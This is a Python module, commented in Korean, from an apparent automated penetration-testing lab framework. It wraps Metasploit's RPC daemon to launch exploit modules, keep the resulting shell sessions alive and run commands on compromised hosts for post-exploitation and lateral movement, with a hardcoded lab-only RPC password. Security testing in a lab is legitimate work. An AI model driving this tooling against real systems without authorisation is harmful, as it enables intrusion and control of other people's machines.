"""
확보한 쉘 세션 관리 - msfrpcd(Metasploit RPC 데몬) 기반 재설계. DESIGN.md 35절.

**기존 한계와 재설계 이유**: 예전 버전은 `msfconsole -x "...; exit"`로 매번 새
프로세스를 띄우고 끝냈다 - 그 프로세스가 죽으면 세션 추적도 같이 끊겨서, "진짜
재연결 가능한 세션"이 근본적으로 불가능했다(post_exploit.py/flag_capture.py가
각자 exploit+명령을 한 스크립트 안에 다 우겨넣어야 했던 이유). 사용자 지적으로
재설계: **msfrpcd를 Kali에서 데몬으로 한 번만 띄워두고**, 우리 코드는 매번 새
프로세스를 띄우는 대신 그 데몬에 RPC(`pymetasploit3`)로 접속해서 명령을 보낸다.
데몬이 살아있는 한 세션도 계속 살아있으므로, **완전히 별도인 파이썬
프로세스/호출에 걸쳐서도 같은 세션을 이어받아 쓸 수 있다** - exploitation ->
post_exploit -> flag_capture -> lateral_movement이 전부 같은 세션을 재사용
가능해짐.

**실전 검증 상태**: RPC 연결/모듈 로드/옵션 설정/익스플로잇 실행/job 추적까지는
호스트 Python에서 Kali의 msfrpcd에 직접 접속해서 실측 확인했다(전부 정상
동작). 다만 "세션 하나를 끝까지 깨끗하게 잡는" 전체 흐름은 테스트에 쓴
vsftpd_234_backdoor가 연결 타이밍에 민감해서(백도어 트리거 후 6200 연결
타이밍이 어긋나면 세션이 안 잡히는 걸 반복 관찰함 - 이 세션 내내 이 타겟이
보여온 것과 같은 불안정성 패턴, RPC 메커니즘 자체의 문제는 아님) 아직 매끈하게
재현하지 못했다. **TODO**: 더 안정적인 타겟/모듈로 end-to-end 재검증할 것.

msfrpcd는 SSL 기본 활성화 상태로 띄우고, 인증은 Kali 로컬 전용 고정
비밀번호를 쓴다(랩 환경 한정 - 외부 노출 네트워크에서는 절대 이대로 쓰면 안
됨). Kali의 hostonly IP에 바인드해서 호스트에서 직접 RPC로 붙는다(guestcontrol
경유 안 함 - 네트워크 RPC라 더 빠르고 pty 문제도 없음, DESIGN.md 26/27절에서
겪은 pwncat-cs의 "비대화형 실행 환경" 문제 자체가 없음).
"""

import time

from pymetasploit3.msfrpc import MsfRpcClient

from core import config  # noqa: F401 - import 시점에 .env를 로드함 + stdout UTF-8 고정
from core.engagement import new_engagement_id
from core.state_store import append_finding
from env.guest_control import run_in_kali
from env.job_runner import start_job

RPC_HOST = "192.168.56.101"  # Kali의 hostonly IP - modules.exploitation._kali_ip()와 같은 값이어야 함
RPC_PORT = 55553
RPC_PASSWORD = "labpass123"  # 랩 전용 고정값 - 외부 노출 네트워크에서는 쓰지 말 것

_client: MsfRpcClient | None = None


def ensure_msfrpcd_running() -> None:
    """msfrpcd가 이미 리스닝 중인지 확인하고, 아니면 Kali에서 데몬으로 띄운다.

    msfrpcd는 시작하면서 자체적으로 fork해서 백그라운드 데몬이 되므로,
    job_runner 입장에서는 job이 곧바로 끝난 걸로 보인다(__JOB_EXIT__ 즉시 찍힘) -
    하지만 실제 msfrpcd 프로세스는 별도 PID로 독립적으로 계속 살아있다(실측
    확인). 프레임워크 전체 모듈 캐시를 로딩하느라 리스닝까지 20~30초 걸린다."""
    check = run_in_kali(f"ss -tln | grep {RPC_PORT}", timeout=15)
    if check.ok and str(RPC_PORT) in check.stdout:
        return

    eid = new_engagement_id("msfrpcd-autostart")
    start_job(eid, f"msfrpcd-daemon-{int(time.time())}", f"msfrpcd -P {RPC_PASSWORD} -a {RPC_HOST} -p {RPC_PORT}")

    for _ in range(20):
        time.sleep(3)
        check = run_in_kali(f"ss -tln | grep {RPC_PORT}", timeout=15)
        if check.ok and str(RPC_PORT) in check.stdout:
            return
    raise RuntimeError(f"msfrpcd가 {RPC_PORT}에서 60초 안에 응답하지 않음 - 수동 확인 필요")


def get_client() -> MsfRpcClient:
    """RPC 클라이언트를 프로세스 안에서 캐시한다. 새 파이썬 프로세스에서 다시
    부르면 연결 객체는 새로 만들지만, msfrpcd 쪽의 세션/job 상태는 그대로
    유지된다 - 이게 핵심(guest_control 기반 msfconsole -x 방식과 다른 점)."""
    global _client
    if _client is None:
        ensure_msfrpcd_running()
        _client = MsfRpcClient(RPC_PASSWORD, server=RPC_HOST, port=RPC_PORT, ssl=True)
    return _client


def run_exploit(engagement_id: str, module: str, options: dict, wait_for_session: int = 25) -> int | None:
    """모듈을 RPC로 실행하고, 새로 생긴 세션의 session_id를 반환한다(못 잡으면
    None). 이 함수가 끝난 뒤에도 세션은 msfrpcd가 살아있는 한 계속 남는다."""
    client = get_client()
    before = set(client.sessions.list.keys())

    exploit = client.modules.use("exploit", module)
    for key, value in options.items():
        exploit[key] = value
    exploit.execute()

    deadline = time.time() + wait_for_session
    session_id = None
    while time.time() < deadline:
        new_ids = set(client.sessions.list.keys()) - before
        if new_ids:
            session_id = int(next(iter(new_ids)))
            break
        time.sleep(2)

    append_finding(
        engagement_id, stage="shell_manager", event="session_established" if session_id else "session_not_established",
        module=module, session_id=session_id,
    )
    return session_id


def run_command(engagement_id: str, session_id: int, command: str, timeout: int = 30) -> str:
    """이미 확보한 세션에 명령 하나를 보내고 출력을 받는다. shell/meterpreter
    세션 둘 다 지원(pymetasploit3가 세션 타입에 따라 알아서 처리 - 둘 다
    run_with_output을 제공함, 실측 확인)."""
    client = get_client()
    session = client.sessions.session(str(session_id))
    output = session.run_with_output(command, timeout=timeout)
    append_finding(
        engagement_id, stage="shell_manager", event="command_executed",
        session_id=session_id, command=command, output=output[:1000],
    )
    return output


def list_sessions() -> dict:
    return get_client().sessions.list


class ShellSession:
    """진짜 재연결 가능한 세션. 예전 버전(msfconsole -x 체이닝)과 달리, 매
    `run()` 호출이 새 익스플로잇을 실행하지 않는다 - `from_exploit()`으로 한
    번 세션을 잡은 뒤, 그 `session_id`를 다른 단계(post_exploit/flag_capture/
    lateral_movement)에 그대로 넘겨서 완전히 별도인 파이썬 호출에서도 이어서
    쓸 수 있다."""

    def __init__(self, engagement_id: str, session_id: int):
        self.engagement_id = engagement_id
        self.session_id = session_id

    def run(self, command: str, timeout: int = 30) -> str:
        return run_command(self.engagement_id, self.session_id, command, timeout=timeout)

    @classmethod
    def from_exploit(
        cls, engagement_id: str, module: str, options: dict, wait_for_session: int = 25,
    ) -> "ShellSession | None":
        session_id = run_exploit(engagement_id, module, options, wait_for_session=wait_for_session)
        return cls(engagement_id, session_id) if session_id is not None else None

    @classmethod
    def attach(cls, engagement_id: str, session_id: int) -> "ShellSession":
        """이미 다른 곳(exploitation.py 등)에서 잡아둔 session_id를 이어받는다."""
        return cls(engagement_id, session_id)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("usage: python -m modules.shell_manager <session_id> [command]")
        print("       (세션이 없으면 먼저 exploit부터 실행해서 확보할 것)")
        sys.exit(1)

    eid = new_engagement_id("shellmgr-cli")
    sid = int(sys.argv[1])
    cmd = " ".join(sys.argv[2:]) or "id"
    session = ShellSession.attach(eid, sid)
    print(session.run(cmd))
